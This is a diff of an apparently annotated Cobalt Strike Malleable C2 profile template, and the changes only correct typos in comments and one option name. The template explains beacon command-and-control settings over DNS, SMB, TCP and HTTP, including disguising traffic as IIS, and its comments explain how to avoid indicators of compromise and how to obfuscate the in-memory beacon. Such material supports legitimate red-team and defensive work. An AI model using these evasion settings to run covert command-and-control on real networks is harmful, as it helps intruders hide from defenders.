@@ -23,7 +23,7 @@ set host_stage "[true|false]";            # Staged payload allow or disallow (No
 set useragent "<Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.177>";    # User-Agent Setup
 
 ### DNS Beacon Block
-set dns_idel "<8.8.8.8>";                 # IP to indicate no tasks available. Avoid useing bogan address "0.0.0.0" (This can be picked up as IOC)
+set dns_idel "<8.8.8.8>";                 # IP to indicate no tasks available. Avoid using bogan address "0.0.0.0" (This can be picked up as IOC)
 set maxdns "[0-255]";                     # Maximum length of hostname when uploading data over DNS (0-255)
 set dns_sleep "<1000>";                   # Force a sleep prior to each individual DNS request. (in milliseconds)
 set dns_stager_prepend "";                # Prepend text to payload stage delivered to DNS TXT record stager
@@ -35,7 +35,7 @@ set dns_ttl "<1>";                        # TTL for DNS replies
 set pipename "<win_svc+8546>";            # Name of pipe to use for SMB beacon's peer-to-peer communication
 set pipename_stager "<win_svc+8546>";     # Name of pipe to use for SMB beacon's named pipe stager
 
-### TCP Beancon Block (P2P)
+### TCP Beacon Block (P2P)
 set tcp_port "<1337>";                    # TCP beacon listen port
 
 ### Self-Signed Certificate HTTPS Beacon Block (This is useful to replicate existing SSL certificate values)
@@ -73,7 +73,7 @@ code-signer {
 # keytool -certreq -alias server -file csr.csr -keystore keystore.jks
 # keytool -import -trustcacerts -alias server -file domain.p7b -keystore keystore.jks
 
-### HTTP/S Global Response Header Config Block
+### HTTP/S Global Response Header Block
 http-config {
     set headers "Server, Content-Type, Cache-Control, Connection, X-Powered-By";        # HTTP header order
     header "Server" "Microsoft-IIS/8.5";
@@ -87,7 +87,7 @@ http-config {
 ### HTTP-GET Block (Beacon check-in for task queued)
 http-get {
     set uri "</image/xxxxxx>";              # For multiple URIs = "/image /index /sexy"
-    set verb "[GET|POST]"                   # Not really need to configu this for http-get, but you can change it to POST if you want
+    set verb "[GET|POST]"                   # Not really need to config this for http-get, but you can change it to POST if you want
 
     client {
         header "Host" "<domain.com>";
@@ -238,8 +238,8 @@ stage {
     set stomppe "[true|false]";                     # Ask ReflectiveLoader to stomp MZ, PE, and e_lfanew values after it loads Beacon payload
                                                         # stomppe [true] - Lightly obfuscate your Beacon DLL
                                                         # stomppe [false] - Allow easy detection
-    set ofuscate "[true|false]";                    # Obfuscate the Reflective DLL's import table (can be IOC), overwrite unused header content, and ask ReflectiveLoader to copy Beacon to new memory without its DLL headers
-                                                    # "ofuscate" takes many steps to obfuscate your Beacon stage and the final state of the DLL in memory    
+    set obfuscate "[true|false]";                   # Obfuscate the Reflective DLL's import table (can be IOC), overwrite unused header content, and ask ReflectiveLoader to copy Beacon to new memory without its DLL headers
+                                                    # "obfuscate" takes many steps to obfuscate your Beacon stage and the final state of the DLL in memory    
     set userwx "[true|false]";                      # Ask ReflectiveLoader to use or avoid RWX permissions for Beacon DLL in memory (can be IOC)
                                                         # userwx [true] - Allow RWX permissions (may bring more attention from analysts and security products)
                                                         # userwx [false] - Ask Beacon's loader to avoid RWX permissions
